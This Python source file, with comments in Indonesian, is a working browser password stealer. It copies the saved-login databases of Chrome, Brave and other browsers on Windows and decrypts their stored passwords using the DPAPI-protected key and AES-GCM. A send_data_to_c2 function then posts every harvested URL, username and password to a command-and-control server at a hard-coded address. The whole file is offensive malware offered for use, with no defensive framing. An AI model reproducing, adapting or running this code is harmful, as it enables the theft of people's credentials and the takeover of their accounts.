import os
import platform
import json
import sqlite3
import base64
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

import shutil


def extract_browser_passwords(browser):
    os_type = platform.system()
    if os_type == "Windows":
        db_path = os.path.expanduser(f"~\\AppData\\Local\\{browser}\\User Data\\Default\\Login Data")
    else:
        return []

    key = get_encryption_key(browser)

    # Buat salinan database agar tidak terkunci
    temp_db = "temp_login_data.db"
    try:
        shutil.copy2(db_path, temp_db)
    except Exception as e:
        print(f"[-] Gagal menyalin database: {e}")
        return []

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, key)
            passwords.append({"url": url, "username": username, "password": decrypted_password.decode()})
    except sqlite3.OperationalError as e:
        print(f"[-] Error SQLite: {e}")
        passwords = []

    conn.close()
    os.remove(temp_db)  # Hapus file sementara setelah digunakan
    return passwords


def get_encryption_key(browser):
    os_type = platform.system()
    if os_type == "Windows":
        import win32crypt
        local_state_path = os.path.expanduser(f"~\\AppData\\Local\\{browser}\\User Data\\Local State")

        # **Tambahkan pengecekan keberadaan file**
        if not os.path.exists(local_state_path):
            print(f"[-] File Local State tidak ditemukan untuk {browser}.")
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    elif os_type in ["Linux", "Darwin"]:
        return None  # Implementasi Linux/macOS menggunakan Keyring/Keychain


def decrypt_password(encrypted_password, key):
    try:
        if not encrypted_password or len(encrypted_password) < 16:
            return b""

        iv = encrypted_password[3:15]  # IV disimpan dari byte ke-3 hingga ke-15
        encrypted_data = encrypted_password[15:-16]  # Data terenkripsi tanpa authentication tag
        auth_tag = encrypted_password[-16:]  # Tag otentikasi dari 16 byte terakhir

        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, auth_tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(encrypted_data) + decryptor.finalize()
    except Exception as e:
        print(f"[-] Decryption error: {e}")
        return b""



# def extract_browser_passwords(browser):
#     os_type = platform.system()
#     if os_type == "Windows":
#         db_path = os.path.expanduser(f"~\\AppData\\Local\\{browser}\\User Data\\Default\\Login Data")
#     elif os_type == "Linux":
#         db_path = os.path.expanduser(f"~/.config/{browser.lower()}/Default/Login Data")
#     elif os_type == "Darwin":
#         db_path = os.path.expanduser(f"~/Library/Application Support/{browser}/Default/Login Data")
#     else:
#         return []
#
#     key = get_encryption_key(browser)
#     conn = sqlite3.connect(db_path)
#     cursor = conn.cursor()
#     cursor.execute("SELECT action_url, username_value, password_value FROM logins")
#     passwords = []
#     for row in cursor.fetchall():
#         url, username, encrypted_password = row
#         decrypted_password = decrypt_password(encrypted_password, key)
#         passwords.append({"url": url, "username": username, "password": decrypted_password.decode()})
#     conn.close()
#     return passwords


def send_data_to_c2(data):
    url_c2 = "http://192.168.0.20:1224/uploads"
    try:
        response = requests.post(url_c2, json={"passwords": data}, timeout=10)
        if response.status_code == 200:
            print("[+] Passwords successfully sent to C2.")
        else:
            print("[-] Failed to send passwords to C2.")
    except requests.RequestException:
        print("[-] Error connecting to C2.")


def main():
    print("[+] Extracting saved passwords from browsers...")
    browsers = ["Google\\Chrome", "BraveSoftware\\Brave-Browser", "Mozilla\\Firefox", "Safari"]
    all_passwords = []
    for browser in browsers:
        passwords = extract_browser_passwords(browser)
        all_passwords.extend(passwords)
    send_data_to_c2(all_passwords)
    print("[+] Data exfiltration complete.")


if __name__ == "__main__":
    main()
